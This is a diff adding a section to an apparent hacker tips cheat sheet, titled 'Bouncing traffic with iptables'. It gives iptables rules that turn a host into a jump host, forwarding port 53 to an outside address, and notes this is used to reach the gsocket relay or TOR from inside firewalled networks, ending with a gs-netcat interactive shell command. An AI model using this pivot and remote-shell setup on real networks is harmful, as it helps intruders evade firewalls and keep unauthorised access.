@@ -31,6 +31,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Tunnel and forwarding](#tunnel)
       1. [Raw TCP reverse ports](#ports)
       1. [HTTPS reverse forwards](#https)
+      2. [Bouncing traffic with iptables](#iptables)
    1. [Use any tool via Socks Proxy](#scan-proxy)
    1. [Find your public IP address](#your-ip)
    1. [Check reachability from around the world](#check-reachable)
@@ -547,6 +548,33 @@ curl -x socks5h://0 ipinfo.io
 ```
 
 More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvesec/port-forwarding) and [Tunnel via Cloudflare to any TCP Service](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) and [Awesome Tunneling](https://github.com/anderspitman/awesome-tunneling).
+
+---
+<a id="iptables"></a>
+**3.iii.c Bouncing traffic with iptables***
+
+Use the host 192.168.0.100 as a Jump-Host: Forward any connection from anywhere to 192.168.0.100:53 onwards to 1.2.3.4:443.
+```sh
+FPORT=53
+DSTIP=1.2.3.4
+DPORT=443
+echo 1 >/proc/sys/net/ipv4/ip_forward
+
+iptables -t mangle -I PREROUTING -p tcp --dport ${FPORT:?} -m addrtype --dst-type LOCAL -j MARK --set-mark 1188 
+iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
+
+iptables -t nat -I PREROUTING -p tcp -m mark --mark 1188 -j DNAT --to ${DSTIP:?}:${DPORT:?}
+iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
+
+iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
+iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+
+iptables -t mangle -I INPUT -m mark --mark 1188 -j ACCEPT
+iptables -t mangle -I INPUT -j CONNMARK --restore-mark
+```
+> We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
+> GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh
+> GS_HOST=1.2.3.4: GS_PORT=443 gs-netcat -i -s ...
 
 ---
 <a id="scan-proxy"></a>
